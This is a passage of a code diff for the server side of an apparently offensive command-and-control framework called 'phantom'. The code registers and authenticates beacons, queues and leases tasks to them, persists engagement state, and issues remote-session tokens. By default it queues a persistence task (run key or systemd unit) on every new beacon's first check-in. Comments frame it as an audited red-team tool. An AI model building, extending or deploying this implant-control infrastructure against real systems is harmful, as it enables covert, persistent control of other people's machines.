@@ -7,81 +7,1256 @@ Handles beacon check-ins, task distribution, and encrypted result collection.
 
 import asyncio
 import threading
+import time
 import json
 import base64
+import hmac
 import os
+import secrets
 import ssl
 import socket
 import ipaddress
-from datetime import datetime
+from datetime import datetime, timedelta
 from typing import Any, Optional
+
+
+# A task remains leased until its result is acknowledged. If the beacon or
+# response path fails, the task becomes eligible for redelivery after this
+# bounded interval instead of disappearing permanently.
+TASK_LEASE_SECONDS = 60
+MAX_RESULT_OUTPUT_BYTES = 10 * 1024 * 1024
+MAX_RESULTS_PER_BEACON = 1000
 
 from aiohttp import web
 from dotenv import load_dotenv
 from phantom.core.logger import logger
 from phantom.utils.c2_crypto import (
-    get_payload_token, 
-    encrypt_data, 
-    decrypt_data
+    get_payload_token,
+    # Re-exported: the deployment-key primitives are still the public API for
+    # callers that are not tied to one beacon identity, and existing imports
+    # (`from phantom.core.c2_server import encrypt_data`) must keep working.
+    encrypt_data,
+    decrypt_data,
+    # Beacon-facing traffic uses the per-beacon key instead.
+    encrypt_for_beacon,
+    decrypt_for_beacon,
+    get_beacon_download_tokens,
+    get_api_token,
 )
+from phantom.utils.paths import certs_dir, certs_exist
+from phantom.utils.beacon_auth import get_beacon_secrets, verify_request
+from phantom.utils.state import beacon_auth_required, use_mtls
 
-# Load environment variables
+# Load optional environment overrides (secrets are auto-generated)
 load_dotenv()
+
+# B-2: how long a persisted nonce->epoch binding stays meaningful. A replay
+# outside this window is already refused by the request-timestamp freshness
+# check, so keeping it forever would only lock out a peer that reused a nonce
+# long ago. 300s covers the 120s freshness window with margin.
+_REPLAY_TTL_SECONDS = 300.0
 
 
 # ── Shared State ────────────────────────────────────────────────────────────
 # Accessed by both the C2 Shell (main thread) and the aiohttp server (bg thread).
 
+def _auto_persist_allowed() -> bool:
+    """Review-4: auto-persist on first check-in is an ENGAGEMENT GRANT.
+
+    Default ON (owner decision Q-1), overridable per engagement via
+    `c2.auto_persist` in data/config.json or PHANTOM_AUTO_PERSIST=0. When
+    off, a new beacon is register-only and the skipped side effect is
+    written to the audit chain.
+    """
+    try:
+        from phantom.utils import config as cfg
+        return cfg.get_bool("c2.auto_persist", True,
+                            env="PHANTOM_AUTO_PERSIST")
+    except Exception:
+        return True
+
+
+def _auto_shell_allowed() -> bool:
+    """9.3: auto-open shell is an ENGAGEMENT GRANT, default OFF.
+
+    Auto-open shell means: on a beacon's FIRST check-in the server queues
+    ONE harmless `health` task, so the operator is handed a live console
+    with evidence the task channel works, instead of clicking through the
+    UI to find out. It is off by default (a new beacon must not receive
+    unsolicited tasks), overridable per engagement via `c2.auto_shell` in
+    data/config.json or PHANTOM_AUTO_SHELL=1, and every automatic queue is
+    written to the audit chain.
+    """
+    try:
+        from phantom.utils import config as cfg
+        return cfg.get_bool("c2.auto_shell", False,
+                            env="PHANTOM_AUTO_SHELL")
+    except Exception:
+        return False
+
+
+class TaskPolicyError(PermissionError):
+    """A task was refused by the typed-task policy (P1-1): unknown verb,
+    capability not granted, expired, or malformed."""
+
+
+# Duro-1: the engagement state (beacons, their queues, the collected
+# results, the auto-shell grant) is written to disk, so a listener restart
+# does not wipe the operation. `_STATE_PERSIST_INTERVAL` is the DEBOUNCE: a
+# beacon checking in every few seconds must not write the file every few
+# seconds, but a change the operator would miss after a crash must not wait
+# for a quiet moment either — see `_persist_state`.
+_STATE_VERSION = 1
+_STATE_PERSIST_INTERVAL = 2.0
+
+# BOUNDED RETENTION. The file is rewritten whole on every save, so an
+# unbounded history is an unbounded write: measured 2026-11-05, the operator's
+# state file was 116 KB with 45 beacon records, most of them stale test
+# artefacts from one afternoon, and nothing ever removed them. These caps keep
+# the NEWEST records and drop the oldest by timestamp.
+MAX_BEACONS = 200
+MAX_TASKS = 2000
+MAX_RESULTS = 2000
+
+#: Fields consulted, in order, to date a record. Producers stamp different
+#: keys; a record with none of them sorts OLDEST, because it cannot be shown
+#: to be recent and keeping it while dropping a dated one would lose the newer
+#: half of the operation without saying so.
+_STAMP_KEYS = ("last_seen", "seen", "updated", "created", "timestamp",
+               "ts", "time")
+
+
+def _record_stamp(record: Any) -> str:
+    """A sortable timestamp for one persisted record ('' when undatable)."""
+    if not isinstance(record, dict):
+        return ""
+    for key in _STAMP_KEYS:
+        value = record.get(key)
+        if isinstance(value, bool):
+            continue
+        if isinstance(value, (int, float)):
+            return f"{float(value):020.6f}"
+        if isinstance(value, str) and value.strip():
+            return value.strip()
+    return ""
+
+
+def _bounded(mapping: Any, cap: int) -> tuple:
+    """Return ``(kept, dropped)`` with at most ``cap`` entries, newest kept.
+
+    Dict order is preserved on the survivors, so the on-disk shape does not
+    churn between saves. Sorting is stable: equally-dated (or undatable)
+    records keep insertion order and the earliest inserted are the first to
+    go, which is the best available reading of "oldest".
+    """
+    if not isinstance(mapping, dict) or len(mapping) <= cap:
+        return mapping, 0
+    keys = list(mapping)
+    keys.sort(key=lambda k: _record_stamp(mapping.get(k)))
+    drop = set(keys[:len(keys) - cap])
+    kept = {k: v for k, v in mapping.items() if k not in drop}
+    return kept, len(drop)
+
+
 class C2State:
     """Thread-safe state shared by the C2 shell and aiohttp listener."""
 
     def __init__(self):
-        self.lock = threading.Lock()
+        # RLock: result decoding calls _append_live_segment / artifact
+        # savers that re-acquire the lock for their own bookkeeping.
+        self.lock = threading.RLock()
         self.beacons: dict[str, dict[str, Any]] = {}
         self.tasks: dict[str, list[dict[str, Any]]] = {}
         self.results: dict[str, list[dict[str, Any]]] = {}
+        self.auth_counters: dict[str, int] = {}
+        self.auth_nonces: dict[str, set[str]] = {}
+        # P0-8: every boot stamps a fresh epoch. A request REPLAYED after a
+        # server restart belongs to the previous epoch: its nonce was issued
+        # under the old epoch, and the stale-epoch check below refuses it.
+        # The epoch rotates on every process start (secrets token).
+        self.auth_epoch = secrets.token_hex(8)
+        logger.info(f"C2 state epoch {self.auth_epoch} (replay safety)")
+        # progressive screen-stream segments per beacon (TRUE live): appended
+        # as they arrive, served to the UI for real-time viewing.
+        self.live_segments: dict[str, list[dict[str, Any]]] = {}
+        # epoch a nonce was first seen under (per beacon): a nonce that shows
+        # up under a DIFFERENT epoch than it was issued in is a replay.
+        self._nonce_epoch: dict[str, dict[str, str]] = {}
+        # B-2: the epoch map is PERSISTED (see _load/_persist_replay_state),
+        # otherwise it is wiped by the same restart that wipes auth_nonces and
+        # the stale-epoch check can never fire. The in-memory nonce SET is
+        # deliberately not restored: the epoch mismatch is the guard.
+        self._nonce_time: dict[str, dict[str, float]] = {}
+        self._replay_state_path = self._resolve_replay_state_path()
+        self._replay_persist_last = 0.0
+        self._load_replay_state()
+        # Duro-1: the durable ENGAGEMENT state is a separate file from the
+        # replay guard on purpose. They have different lifecycles (the replay
+        # map is a short-lived security window, the engagement is the
+        # operation) and different failure modes: a corrupt state file must
+        # not be able to disarm replay protection, and vice versa.
+        self._state_persist_path = self._resolve_state_path()
+        self._state_persist_last = 0.0
+        self._state_dirty = False
+        # how many records the LAST save dropped to respect the caps, so the
+        # operator can see the compaction instead of discovering it.
+        self._state_dropped: dict[str, int] = {
+            "beacons": 0, "tasks": 0, "results": 0}
+        # Review-3: the remote-session modules get their OWN expiring token.
+        # The global payload token unlocks EVERY payload forever; a remote
+        # session is a time-boxed capability grant with its own revocation,
+        # so a leaked dropper URL is useless after the window closes.
+        self.remote_sessions: dict[str, dict[str, Any]] = {}
+        # 9.3: hand the operator a live console on a new beacon (one
+        # `health` task). Off by default — see `_auto_shell_allowed` —
+        # and togglable at runtime from the UI/API.
+        self.auto_shell: bool = _auto_shell_allowed()
+        # ...and only NOW, with every default in place, adopt what the
+        # previous process left on disk (the file wins: a runtime toggle is
+        # more recent than the config it was toggled from).
+        self._load_state()
+
+    @staticmethod
+    def _resolve_replay_state_path() -> str:
+        try:
+            from phantom.utils.paths import data_dir
+            return os.path.join(data_dir(), "c2_replay.json")
+        except Exception:
+            return ""
+
+    def _load_replay_state(self) -> None:
+        """Reload persisted nonce->epoch bindings (B-2).
+
+        Entries older than `_REPLAY_TTL_SECONDS` are DROPPED: a replay outside
+        the freshness window is already refused by the timestamp check, so
+        keeping it forever would only lock out a peer that (wrongly) reused a
+        nonce long ago. A restart within the window still refuses the replay.
+        """
+        path = self._replay_state_path
+        if not path or not os.path.exists(path):
+            return
+        try:
+            with open(path, "r", encoding="utf-8") as handle:
+                data = json.load(handle)
+        except Exception:
+            return
+        by_node = data.get("by_node") if isinstance(data, dict) else None
+        if not isinstance(by_node, dict):
+            return
+        now = time.time()
+        for beacon_id, entries in by_node.items():
+            if not isinstance(entries, dict):
+                continue
+            clean, times = {}, {}
+            for nonce, val in entries.items():
+                if isinstance(val, list) and len(val) == 2:
+                    epoch, ts = str(val[0]), float(val[1] or 0)
+                else:
+                    epoch, ts = str(val), 0.0
+                if not epoch or epoch == self.auth_epoch:
+                    continue
+                if now - ts > _REPLAY_TTL_SECONDS:
+                    continue
+                clean[str(nonce)] = epoch
+                times[str(nonce)] = ts
+            if clean:
+                self._nonce_epoch[str(beacon_id)] = clean
+                self._nonce_time[str(beacon_id)] = times
+
+    def _persist_replay_state(self) -> None:
+        """Atomically persist the epoch map with timestamps (B-2)."""
+        path = self._replay_state_path
+        if not path:
+            return
+        try:
+            payload = {"by_node": {}}
+            for beacon_id, epochs in self._nonce_epoch.items():
+                if not epochs:
+                    continue
+                times = self._nonce_time.get(beacon_id, {})
+                payload["by_node"][beacon_id] = {
+                    n: [e, times.get(n, time.time())]
+                    for n, e in epochs.items()}
+            tmp = path + ".tmp"
+            with open(tmp, "w", encoding="utf-8") as handle:
+                json.dump(payload, handle, separators=(",", ":"))
+            os.replace(tmp, path)
+        except Exception:
+            pass
+
+    # ── durable engagement state (see _STATE_VERSION above) ────────────
+
+    @staticmethod
+    def _resolve_state_path() -> str:
+        """Where the durable engagement state lives.
+
+        `PHANTOM_C2_STATE_PATH` overrides the location, which is how the test
+        suite and CI keep the operator's REAL state file out of the picture.
+        """
+        override = os.environ.get("PHANTOM_C2_STATE_PATH", "").strip()
+        if override:
+            return override
+        try:
+            from phantom.utils.paths import data_dir
+            return os.path.join(data_dir(), "c2_state.json")
+        except Exception:
+            return ""
+
+    def _load_state(self) -> bool:
+        """Adopt the engagement a previous process left on disk.
+
+        Without this, a listener restart (or a reboot) wiped every beacon
+        record, every queued task and every collected result while the
+        beacons themselves were still out there checking in — the operator
+        lost the operation and could not even tell what had been lost.
+
+        A file we cannot TRUST is refused and SAID OUT LOUD: starting with an
+        empty engagement is a decision the operator has to be able to see,
+        not silent amnesia. Nothing here raises.
+        """
+        path = self._state_persist_path
+        if not path or not os.path.exists(path):
+            return False
+        try:
+            with open(path, "r", encoding="utf-8") as handle:
+                data = json.load(handle)
+        except Exception as exc:
+            kept = self._quarantine_state("unreadable")
+            logger.warning(f"C2 state unreadable ({exc}): starting with an "
+                           f"empty engagement; the file is kept for "
+                           f"inspection at {kept}")
+            return False
+        if not isinstance(data, dict):
+            kept = self._quarantine_state("not-an-object")
+            logger.warning("C2 state is not an object: starting with an empty "
+                           f"engagement; the file is kept at {kept}")
+            return False
+        version = data.get("version")
+        if version != _STATE_VERSION:
+            kept = self._quarantine_state(f"version-{version}")
+            logger.warning(
+                f"C2 state version {version!r} != {_STATE_VERSION}: refused "
+                f"rather than interpreted, starting with an empty engagement; "
+                f"the file is kept at {kept}")
+            return False
+
+        def _records(raw: Any, many: bool) -> dict[str, list[dict[str, Any]]]:
+            out: dict[str, list[dict[str, Any]]] = {}
+            if not isinstance(raw, dict):       # valid JSON, wrong shape
+                return out
+            for key, value in raw.items():
+                if many:
+                    out[str(key)] = [dict(item) for item in value or []
+                                     if isinstance(item, dict)]
+                elif isinstance(value, dict):
+                    out[str(key)] = dict(value)
+            return out
+
+        with self.lock:
+            beacons = _records(data.get("beacons"), many=False)
+            tasks = _records(data.get("tasks"), many=True)
+            results = _records(data.get("results"), many=True)
+            # A beacon is the unit of truth: a queue/result list missing from
+            # the file (older schema, partial write) must not make the
+            # beacon undrainable.
+            for beacon_id in beacons:
+                tasks.setdefault(beacon_id, [])
+                results.setdefault(beacon_id, [])
+            self.beacons = beacons
+            self.tasks = tasks
+            self.results = results
+            if isinstance(data.get("auto_shell"), bool):
+                self.auto_shell = bool(data["auto_shell"])
+        queued = sum(len(v) for v in self.tasks.values())
+        logger.info(f"C2 state restored: {len(self.beacons)} beacon(s), "
+                    f"{queued} queued task(s), "
+                    f"{sum(len(v) for v in self.results.values())} result(s), "
+                    f"auto-shell {'on' if self.auto_shell else 'off'}")
+        return True
+
+    def _quarantine_state(self, reason: str) -> str:
+        """Move a state file we refused to read out of the way.
+
+        The log message always said "the file is kept for inspection", and it
+        was not: the NEXT `_persist_state` wrote its temp file and
+        ``os.replace``d it onto the very path the operator was told to go and
+        look at. Renaming first makes the promise true and leaves the rejected
+        engagement readable next to the fresh one.
+
+        Best effort: a rename that fails must not stop the listener from
+        starting, and the returned path says what actually happened.
+        """
+        path = self._state_persist_path
+        if not path or not os.path.exists(path):
+            return path or ""
+        stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
+        target = f"{path}.rejected-{reason}-{stamp}"
+        try:
+            os.replace(path, target)
+            return target
+        except OSError as exc:
+            logger.warning(f"could not set the rejected C2 state aside "
+                           f"({exc}): the next write will overwrite it")
+            return path
+
+    def reload(self) -> bool:
+        """Load the persisted state, but ONLY into an empty store.
+
+        A listener started in a fresh process adopts the engagement the
+        previous one left behind; a process that already holds state keeps
+        what it has. Silently replacing live in-memory records with a file
+        would lose whatever happened after the last write.
+        """
+        with self.lock:
+            if self.beacons or self.tasks or self.results:
+                return False
+        return self._load_state()
+
+    def _persist_state(self, force: bool = False) -> None:
+        """Atomically write the engagement state, debounced.
+
+        The debounce exists because `update_beacon` runs on EVERY beacon
+        check-in: writing there would turn a polling beacon into a disk
+        writer. A change inside the window marks the store dirty and the next
+        qualifying change (or `flush()`) writes the latest state, so the loss
+        window is bounded by the interval, never by the end of the run.
+
+        `force=True` is for RARE, deliberate, operator-driven changes (the
+        auto-shell toggle) and for the shutdown flush: those must land even if
+        nothing else ever changes again.
+
+        SECRETS NEVER LAND HERE: the payload goes through the same scrubber
+        the portable `.pm` export uses, so the two persistence paths cannot
+        drift on what a secret is. A beacon HMAC key on disk would let anyone
+        who reads the file impersonate that beacon to this listener.
+        """
+        path = self._state_persist_path
+        if not path:
+            return
+        now = time.monotonic()
+        if not force and now - self._state_persist_last < _STATE_PERSIST_INTERVAL:
+            self._state_dirty = True
+            return
+        try:
+            from phantom.utils.session_bundle import _jsonable, _scrub_secrets
+        except Exception as exc:                # fail CLOSED: no file, no leak
+            logger.warning(f"C2 state NOT written: refusing to persist "
+                           f"engagement state without the secret scrubber "
+                           f"({exc.__class__.__name__})")
+            return
+        with self.lock:
+            beacons, dropped_beacons = _bounded(_jsonable(self.beacons),
+                                                MAX_BEACONS)
+            tasks, dropped_tasks = _bounded(_jsonable(self.tasks), MAX_TASKS)
+            results, dropped_results = _bounded(_jsonable(self.results),
+                                                MAX_RESULTS)
+            payload = {
+                "version": _STATE_VERSION,
+                "saved_at": datetime.now().isoformat(timespec="seconds"),
+                "beacons": _scrub_secrets(beacons),
+                "tasks": _scrub_secrets(tasks),
+                "results": _scrub_secrets(results),
+                "auto_shell": bool(self.auto_shell),
+            }
+            # In memory the engagement is complete; only the FILE is bounded.
+            # The counts stay out of the payload so the on-disk schema is
+            # unchanged for every existing reader.
+            self._state_dropped = {"beacons": dropped_beacons,
+                                   "tasks": dropped_tasks,
+                                   "results": dropped_results}
+        try:
+            directory = os.path.dirname(os.path.abspath(path))
+            if directory:
+                os.makedirs(directory, exist_ok=True)
+            tmp = path + ".tmp"
+            with open(tmp, "w", encoding="utf-8") as handle:
+                json.dump(payload, handle, separators=(",", ":"))
+            # os.replace: a process killed mid-write must never leave a
+            # half-written state file for the next boot to trust.
+            os.replace(tmp, path)
+        except Exception as exc:
+            logger.warning(f"C2 state write failed ({exc}): the engagement "
+                           f"on disk is stale")
+            return
+        self._state_persist_last = now
+        self._state_dirty = False
+
+    def flush(self) -> None:
+        """Write whatever the debounce deferred (used on shutdown)."""
+        self._persist_state(force=True)
+
+    def compacted(self) -> dict[str, int]:
+        """How many records the LAST save dropped to respect the caps."""
+        with self.lock:
+            return dict(self._state_dropped)
+
+    def stats(self) -> dict[str, Any]:
+        """Retention at a glance: live counts, caps and last compaction."""
+        with self.lock:
+            return {
+                "beacons": len(self.beacons),
+                "tasks": len(self.tasks),
+                "results": len(self.results),
+                "max_beacons": MAX_BEACONS,
+                "max_tasks": MAX_TASKS,
+                "max_results": MAX_RESULTS,
+                "dropped_last_save": dict(self._state_dropped),
+            }
+
+    def set_auto_shell(self, enabled: bool) -> bool:
+        """Turn auto-open shell on/off for this run (audited)."""
+        self.auto_shell = bool(enabled)
+        logger.info(f"Auto-shell {'ENABLED' if self.auto_shell else 'disabled'}")
+        # rare and deliberate: write it now, or a toggle made seconds before a
+        # crash would only exist in the process that just died.
+        self._persist_state(force=True)
+        try:
+            from phantom.utils.audit_log import audit_log
+            audit_log.append("auto_shell_toggled", enabled=self.auto_shell)
+        except Exception:
+            pass
+        return self.auto_shell
+
+    # ── remote session grants (Review-3) ───────────────────────────────
+
+    def issue_remote_session(self, beacon_id: str = "",
+                             ttl_seconds: int = 21600) -> dict[str, Any]:
+        """Create a scoped, expiring token for the Remote Session module."""
+        token = secrets.token_urlsafe(32)
+        session_id = "RS-" + secrets.token_hex(6).upper()
+        now = datetime.now()
+        record = {
+            "session_id": session_id,
+            "token": token,
+            "beacon_id": beacon_id,
+            "issued_at": now.isoformat(timespec="seconds"),
+            "expires_at": (now + timedelta(seconds=max(60, int(ttl_seconds)))
+                           ).isoformat(timespec="seconds"),
+            "revoked": False,
+        }
+        with self.lock:
+            self.remote_sessions[token] = record
+        try:
+            from phantom.utils.audit_log import audit_log
+            audit_log.append("remote_session_issued", session_id=session_id,
+                             beacon_id=beacon_id, ttl_seconds=int(ttl_seconds))
+        except Exception:
+            pass
+        return record
+
+    def check_remote_session(self, token: str) -> tuple[bool, str]:
+        """Validate a remote-session token: exists, not revoked, not expired."""
+        if not token:
+            return False, "missing session token"
+        with self.lock:
+            record = self.remote_sessions.get(token)
+        if not record:
+            return False, "unknown session token"
+        if record.get("revoked"):
+            return False, "session revoked"
+        try:
+            expires = datetime.fromisoformat(str(record.get("expires_at", "")))
+        except ValueError:
+            return False, "malformed session record"
+        if datetime.now() > expires:
+            return False, "session expired"
+        return True, str(record.get("session_id", ""))
+
+    def revoke_remote_session(self, token: str = "", beacon_id: str = "") -> int:
+        """Revoke one token (or every session of a beacon). Returns the count."""
+        revoked = 0
+        with self.lock:
+            for record in self.remote_sessions.values():
+                if record.get("revoked"):
+                    continue
+                if token and record.get("token") != token:
+                    continue
+                if beacon_id and record.get("beacon_id") != beacon_id:
+                    continue
+                record["revoked"] = True
+                revoked += 1
+        if revoked:
+            try:
+                from phantom.utils.audit_log import audit_log
+                audit_log.append("remote_session_revoked", beacon_id=beacon_id,
+                                 count=revoked)
+            except Exception:
+                pass
+        return revoked
+
+    def authenticate_beacon(self, request: web.Request, body: str) -> bool:
+        """Validate a registered beacon's HMAC and reject replayed requests.
+
+        Existing unregistered beacons remain compatible only while
+        PHANTOM_BEACON_AUTH_REQUIRED is unset. Once an identity is enrolled,
+        that identity always requires the HMAC headers.
+        """
+        beacon_id = request.headers.get("X-Beacon-Id", "")
+        secrets_for_beacon = get_beacon_secrets(beacon_id)
+        if not secrets_for_beacon:
+            # P0-4 (fail-closed): an unenrolled beacon is accepted ONLY when
+            # auth is explicitly disabled AND the listener is loopback. On a
+            # non-loopback bind an unauthenticated check-in is refused — a
+            # 0.0.0.0 listener must never become an open C2 by default.
+            if not beacon_auth_required() and _is_loopback_bind():
+                return True
+            logger.warning(
+                f"Refused unenrolled beacon check-in from {request.remote} "
+                f"(auth_required={beacon_auth_required()}, "
+                f"loopback={_is_loopback_bind()})")
+            return False
+
+        timestamp = request.headers.get("X-Beacon-Timestamp", "")
+        counter = request.headers.get("X-Beacon-Counter", "")
+        nonce = request.headers.get("X-Beacon-Nonce", "")
+        signature = request.headers.get("X-Beacon-Auth", "")
+        if not any(verify_request(secret, request.method, request.path,
+                                  timestamp, counter, nonce, signature, body)
+                   for secret in secrets_for_beacon):
+            return False
+
+        try:
+            counter_value = int(counter)
+        except ValueError:
+            return False
+        with self.lock:
+            used_nonces = self.auth_nonces.setdefault(beacon_id, set())
+            if nonce in used_nonces:
+                return False
+            # P0-8: epoch binding — a nonce first seen under a previous
+            # epoch (i.e. issued before the last server restart) is a
+            # replay: refuse it even though the in-memory set was wiped.
+            epochs = self._nonce_epoch.setdefault(beacon_id, {})
+            times = self._nonce_time.setdefault(beacon_id, {})
+            prior_epoch = epochs.get(nonce)
+            if prior_epoch is not None and prior_epoch != self.auth_epoch \
+                    and time.time() - times.get(nonce, 0.0) <= _REPLAY_TTL_SECONDS:
+                logger.warning(
+                    f"Replay (stale epoch) detected for beacon {beacon_id}: "
+                    f"nonce issued under {prior_epoch}, server epoch is "
+                    f"{self.auth_epoch}")
+                return False
+            epochs[nonce] = self.auth_epoch
+            times[nonce] = time.time()
+            used_nonces.add(nonce)
+            # Bound memory while retaining enough history for the replay window.
+            if len(used_nonces) > 256:
+                self.auth_nonces[beacon_id] = set(list(used_nonces)[-128:])
+                # keep the epoch map bounded alongside the nonce set
+                kept = self.auth_nonces[beacon_id]
+                self._nonce_epoch[beacon_id] = {
+                    n: e for n, e in epochs.items() if n in kept}
+                self._nonce_time[beacon_id] = {
+                    n: t for n, t in times.items() if n in kept}
+            # Counter is advisory (high-water mark, used only for telemetry):
+            # after a migrate or process restart the beacon's counter resets,
+            # and a strict monotonic check would permanently lock it out.
+            # Replay protection is carried by the per-request random nonce
+            # plus the ±max_skew timestamp freshness verified above.
+            last_counter = self.auth_counters.get(beacon_id, -1)
+            if counter_value > last_counter:
+                self.auth_counters[beacon_id] = counter_value
+            # B-2: persist the epoch map (throttled to once a second) so the
+            # stale-epoch refusal survives the next restart.
+            now_mono = time.monotonic()
+            if now_mono - self._replay_persist_last >= 1.0:
+                self._replay_persist_last = now_mono
+                self._persist_replay_state()
+        return True
 
     def update_beacon(self, beacon_id: str, info: dict[str, Any]) -> None:
         with self.lock:
-            info["last_seen"] = datetime.now().isoformat(timespec="seconds")
+            now = datetime.now().isoformat(timespec="seconds")
             if beacon_id not in self.beacons:
+                info["last_seen"] = now
                 self.beacons[beacon_id] = info
                 self.tasks[beacon_id] = []
                 self.results[beacon_id] = []
                 logger.info(f"New beacon registered: {beacon_id} ({info.get('ip')})")
-                # Auto-persist for new beacons
+                try:
+                    from phantom.utils.audit_log import audit_log
+                    audit_log.append("beacon_registered", beacon_id=beacon_id,
+                                     ip=info.get("ip", ""), os=info.get("os", ""),
+                                     user=info.get("user", ""),
+                                     hostname=info.get("hostname", ""))
+                except Exception:
+                    pass
+                # Auto-persist for new beacons (DOCUMENTED DEFAULT — owner
+                # decision Q-1 in docs/ROADMAP.md: keep, audited). This is
+                # a deliberate lab/engagement shortcut: the beacon's very
+                # first check-in queues `persist` (no argument -> the beacon
+                # uses its default unit name, PhantomBeacon; passing the
+                # method name would create a unit literally called
+                # "systemd"/"runkey"). Every occurrence lands in the
+                # immutable audit log with the chosen method so an operator
+                # reviewing the chain sees the side effect, not just the
+                # registration.
+                # AUTO-OPEN SHELL (9.3): the operator asked to be handed a
+                # live console the moment a beacon lands. ONE harmless
+                # `health` task, queued FIRST (before the auto-persist the
+                # block below may add), for a NEW beacon only — a session
+                # resume keeps its preserved queue and gets nothing.
+                if self.auto_shell:
+                    task_id = self._new_task_id()
+                    self.tasks[beacon_id].append({"task_id": task_id,
+                                                  "command": "health"})
+                    logger.info(f"Auto-shell (health) queued for new beacon "
+                                f"{beacon_id} (Task: {task_id})")
+                    try:
+                        from phantom.utils.audit_log import audit_log
+                        audit_log.append("auto_shell_queued",
+                                         beacon_id=beacon_id,
+                                         task_id=task_id)
+                    except Exception:
+                        pass
                 os_type = info.get("os", "").lower()
                 if "windows" in os_type:
                     method = "runkey"
-                else:
+                elif "linux" in os_type or "android" in os_type:
                     method = "systemd"
-                task_id = datetime.now().strftime("%Y%m%d%H%M%S%f")
-                self.tasks[beacon_id].append({"task_id": task_id, "command": f"persist {method}"})
-                logger.info(f"Auto-persist ({method}) queued for new beacon {beacon_id} (Task: {task_id})")
+                else:
+                    # The command queued below is the bare `persist`, and the
+                    # beacon resolves its own native default: naming a
+                    # concrete method for a beacon that never reported an OS
+                    # (transport harness, telemetry without an `OS:` line)
+                    # put a false claim into the operator log and into the
+                    # immutable audit chain.
+                    method = "unknown"
+                # Review-4: the shortcut stays (owner decision Q-1) but is now
+                # an explicit engagement grant instead of an unconditional
+                # side effect: `c2.auto_persist=false` (or
+                # PHANTOM_AUTO_PERSIST=0) turns the first check-in into
+                # register-only, which is what a multi-operator engagement or
+                # an approved-rules-of-engagement run needs. Either way the
+                # decision is written to the immutable audit log.
+                if _auto_persist_allowed():
+                    task_id = self._new_task_id()
+                    self.tasks[beacon_id].append({"task_id": task_id,
+                                                  "command": "persist"})
+                    logger.info(f"Auto-persist ({method}) queued for new beacon "
+                                f"{beacon_id} (Task: {task_id})")
+                    try:
+                        from phantom.utils.audit_log import audit_log
+                        audit_log.append("auto_persist_queued", beacon_id=beacon_id,
+                                         method=method, task_id=task_id)
+                    except Exception:
+                        pass
+                else:
+                    logger.info(f"Auto-persist SKIPPED for {beacon_id} "
+                                f"(engagement grant disabled)")
+                    try:
+                        from phantom.utils.audit_log import audit_log
+                        audit_log.append("auto_persist_skipped", beacon_id=beacon_id,
+                                         method=method,
+                                         reason="c2.auto_persist disabled")
+                    except Exception:
+                        pass
+                # A REGISTRATION is a state change a restart must not lose:
+                # the beacon is real, its queue is not empty, and every later
+                # report is built from this record. A mere `last_seen` refresh
+                # is NOT (that is what the debounce is for). FORCED, because a
+                # registration that lands inside the debounce window only set
+                # `_state_dirty` and nothing ever retried it: two beacons
+                # checking in within 2s and a crash lost the second one.
+                self._persist_state(force=True)
             else:
+                # Session resume: same beacon_id, still alive. If the beacon was
+                # silent for a while, mark the resume so the operator sees the
+                # session re-establishment (task queue is preserved across the
+                # outage and drained on the next check-in).
+                prev = self.beacons[beacon_id].get("last_seen", "")
+                if prev:
+                    try:
+                        gap = (datetime.now() - datetime.fromisoformat(prev)).total_seconds()
+                    except ValueError:
+                        gap = 0
+                    if gap > 60:
+                        info["session_resumed_at"] = now
+                        logger.info(f"Beacon session resumed: {beacon_id} (gap {int(gap)}s)")
+                info["last_seen"] = now
                 self.beacons[beacon_id].update(info)
+                # A beacon marked exited can come BACK (persistence relaunch,
+                # a fresh dropper run, the same build replaying). The check-in
+                # itself proves it is alive: leaving status="exited" makes the
+                # UI report a live, task-serving beacon as EXITED for ever.
+                if self.beacons[beacon_id].get("status") == "exited":
+                    self.beacons[beacon_id]["status"] = "active"
+                    self.beacons[beacon_id].pop("exited_at", None)
 
     def queue_task(self, beacon_id: str, command: str) -> str:
+        # P1-1: the task policy validates the string through the explicit
+        # legacy adapter (known beacon verb, grant-checked, size-capped).
+        # A denied task raises TaskPolicyError with the policy reason — the
+        # API surfaces it as 403, the shell as an operator error.
+        from phantom.core.task_policy import policy as _task_policy
+        decision = _task_policy().check_legacy(beacon_id, command)
+        if not decision.allowed:
+            raise TaskPolicyError(decision.reason)
         with self.lock:
             if beacon_id not in self.tasks:
                 self.tasks[beacon_id] = []
-            task_id = datetime.now().strftime("%Y%m%d%H%M%S%f")
+            task_id = self._new_task_id()
             self.tasks[beacon_id].append({"task_id": task_id, "command": command})
+            # immutable audit trail: every operator/task action is recorded
+            # in a hash-chained log that clients can verify post-engagement
+            try:
+                from phantom.utils.audit_log import audit_log
+                audit_log.append("task_queued", beacon_id=beacon_id,
+                                 task_id=task_id, command=command[:200])
+            except Exception:
+                pass
+            # queued work is exactly what a restart must not lose: a beacon
+            # cannot drain a task nobody remembers issuing. FORCED: inside the
+            # debounce window this used to only mark the store dirty.
+            self._persist_state(force=True)
             return task_id
 
-    def get_pending_tasks(self, beacon_id: str) -> list[dict[str, Any]]:
+    def queue_typed_task(self, beacon_id: str,
+                         task: "object") -> str:
+        """The P1-1 structured form: capability_id + validated args +
+        expiry, authorized against the beacon's grant manifest."""
+        from phantom.core.task_policy import policy as _task_policy
+        decision = _task_policy().check_typed(beacon_id, task)
+        if not decision.allowed:
+            raise TaskPolicyError(decision.reason)
         with self.lock:
-            tasks_to_send = list(self.tasks.get(beacon_id, []))
-            self.tasks[beacon_id] = []  # Clear after retrieval
-            return tasks_to_send
+            if beacon_id not in self.tasks:
+                self.tasks[beacon_id] = []
+            task.task_id = task.task_id or self._new_task_id()
+            self.tasks[beacon_id].append({
+                "task_id": task.task_id, "command": task.render(),
+                "capability_id": task.capability_id,
+                "scope_ref": task.scope_ref,
+                "expires_at": task.expires_at,
+                "mode": "typed",
+            })
+            try:
+                from phantom.utils.audit_log import audit_log
+                audit_log.append("task_queued", beacon_id=beacon_id,
+                                 task_id=task.task_id,
+                                 command=task.render()[:200],
+                                 capability=task.capability_id, mode="typed")
+            except Exception:
+                pass
+            self._persist_state(force=True)
+            return task.task_id
+
+    @staticmethod
+    def _new_task_id() -> str:
+        # timestamp + random suffix: concurrent queue operations (auto-persist
+        # on registration, C2 shell tasks, agent post tasks) can land within
+        # the same microsecond — a bare %f timestamp would collide and mix
+        # results between tasks
+        return f"{datetime.now().strftime('%Y%m%d%H%M%S%f')}-{secrets.token_hex(4)}"
+
+    def get_pending_tasks(self, beacon_id: str) -> list[dict[str, Any]]:
+        """Lease queued tasks without deleting them.
+
+        The previous implementation cleared the queue as soon as a check-in
